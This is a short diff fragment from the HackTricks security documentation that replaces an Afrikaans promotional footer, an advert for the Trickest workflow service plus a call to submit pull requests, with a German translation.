+* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.
 
 </details>
 {% endhint %}
@@ -786,7 +786,7 @@ Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size=
 <figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Gebruik [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=brute-force) om maklik te bou en **werkvloei** te **automate** wat aangedryf word deur die wêreld se **meest gevorderde** gemeenskap gereedskap.\
-Kry Toegang Vandag:
+Nutze [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=brute-force), um einfach **Workflows** zu erstellen und **zu automatisieren**, die von den **fortschrittlichsten** Community-Tools der Welt unterstützt werden.\
+Erhalte heute Zugang:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=brute-force" %}
